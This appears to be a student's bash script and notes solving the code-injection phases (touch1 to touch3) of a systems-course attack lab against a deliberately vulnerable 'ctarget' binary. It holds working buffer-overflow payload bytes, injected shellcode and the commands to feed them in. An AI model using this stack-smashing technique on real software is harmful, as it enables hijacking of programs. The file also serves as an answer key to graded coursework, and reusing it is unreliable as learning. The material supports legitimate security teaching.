#! /usr/bin/bash
### CODE INJECTION ATTACKS
# Script intended to automate ctarget inputs.

# MUST NOT CONTAIN: 0x0a (\n) at any intermediate position. hex val of 0 is 00.
# ordering of byte feeding should be reversed (little-endian)

### touch1 PASS
# touch1 address at 0x00000000004017c0 from objdump -d ctarget.
# in test(), getbuf() is called to obtain buffer input. getbuf retaddr overwritten.
# since getbuf allocates 0x28=40 bytes for its stack frame, the 8 bytes just beyond those 
# are where the function's return address is. 40byte garbage+8byte retaddr touch2().

# Feed exploit bytes via array. Can be done in separate args like $a$b$c>file
array_touch1=('12 34 56 78 9a bc de f0 '
	'12 34 56 78 9a bc de f0 '
	'12 34 56 78 9a bc de f0 '
	'12 34 56 78 9a bc de f0 '
	'12 34 56 78 9a bc de f0 '
	'c0 17 40 00 00 00 00 00')

# echo -e -n ${array_touch1[*]}>cexploit.txt
# ./hex2raw < cexploit.txt | ./ctarget -q # this pipes the output of hex2raw into ctarget


### touch2 PASS
# touch2 address is 0x00000000004017ec when test calls the target fcn, rsp=0x5561dc78. 
# this is due to how creators designed the program, not because protection was turned off.
# should "appear" to take in cookie as argument, 0x59b997fa; %rdi carries 1st arg

# retaddr pointing at injected code, which sets rdi to cookie, and then returns to the
# target fcn touch2. code should contain:
# push touch2 retaddr to stack (executed, examined by nexti, x/g $rsp)
# set %rdi to cookie hex, (executed, examine print /x $rdi)
# ret (it actually went to touch2, examine print $rip. so ret goes to w/e is @ rsp?, 
# and then pops the retaddr off of the stack; 
# and examining the backtrace won't give a parent fcn to touch2() because control flow
# led to it by executing stack data.

# these instructions for compiling asm2obj, then disas to examine the asm and its 
# related instruction bytes, which can then be placed in the injection code.
# array_asm=('pushq $0x4017ec\nmovl $0x59b997fa, %edi\nret\n')
# echo -e -n ${array_asm[*]}>cexploit2.s
# gcc -c cexploit2.s
# objdump -d cexploit2.o > cexploit2.d

# %rip iterates thru instructions from lowest byte to highest. can be stepped via nexti.
# a hint for what the program considers to be the lowest byte @address, x/b $rip

# program actually executes the first injected pushq, 0x78 updated to 0x7f, added 7, 
# the length of inst. after that it exits with SIGSEGV, segmentation fault, as soon as 
# i try to move a value to rdi. when reversing the order, mov rdi then push, it refuses
# to execute, does not increment rip, and exits with SIGSEGV. it refused to pass to 
# register a value too big for edi, since i didn't put $ before the hexval.
array_touch2=(	'68 ec 17 40 00 bf fa 97 b9 59 c3'
				'12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0 12 34 56 78 9a'
				'78 dc 61 55 00 00 00 00')


# echo -e -n ${array_touch2[*]}>cexploit.txt

# NOTE: next wants to find bounds of the known fcn. nexti goes instruction by instruction.

### touch3. PASS. 
# touch3 address 00000000004018fa
# hex of cookie 35 39 62 39 39 37 66 61 00; first placed 16bytes ahead of asmcode, and
# when checking print (char*) $rdi, the string shown is the correct cookie value; string
# address has been encoded correctly.

# circumvent hexmatch overwriting by just putting the string in the first unaffected 
# address, 0x5561dcc0, which is unaffected through several separate executions 
# this WORKS, but does not seem a reliable solution. 
# checked loosely if it is "reliable" by repeating the execution some 30 times, PASS.
# The issue is that this solution corrupts the stack prior to the frame of getbuf etc.
#
# A better solution would be to offset the stack allocation that hexmatch does in order
# to make sure it does not overwrite the passed string. But since this would involve
# decrementing the rsp, the solution may not be transferable to ROP attacks, since the
# gadget farm does not have arithmetic. Since hexmatch takes away from rsp, decreasing 
# the address, it grows the stack further. By 110 bytes, from the stack position where 
# it is called? 128? 


array_asm3=('pushq $0x4018fa\nmovl $0x5561dcc0, %edi\nret\n')
echo -e -n ${array_asm3[*]}>cexploit3.s
gcc -c cexploit3.s
objdump -d cexploit3.o > cexploit3.d

array_touch3=(	'68 fa 18 40 00 bf c0 dc 61 55 c3'
				'12 34 56 78 9a'
				'35 39 62 39 39 37 66 61 00'
				'de f0 12 34 56 78 9a bc de f0 12 34 56 78 9a'
				'78 dc 61 55 00 00 00 00'
				'00 00 00 00 00 00 00 00'
				'00 00 00 00 00 00 00 00'
				'00 00 00 00 00 00 00 00'
				'35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00')

echo -e -n ${array_touch3[*]}>cexploit.txt

# this is how to set up pipes for hex2raw output file. check how pipes work.
./hex2raw < cexploit.txt > cexploit_raw.txt
./ctarget -q -i cexploit_raw.txt


# Input format for: (touch1, ...)
# ./hex2raw < cexploit.txt | ./ctarget -q


### DISCUSSION OF CODE INJECTION: 

# arguably, there is sense in hijacking the retaddr to reroute to another, existing
# fcn in the program; it may carry out the tasks that the attacker wants. 

# These three tasks are on a program designed to have static stack space with no CET
# protection, no endbr64 in asmcode, no control flow guards or an active NX. the stack
# is also executable.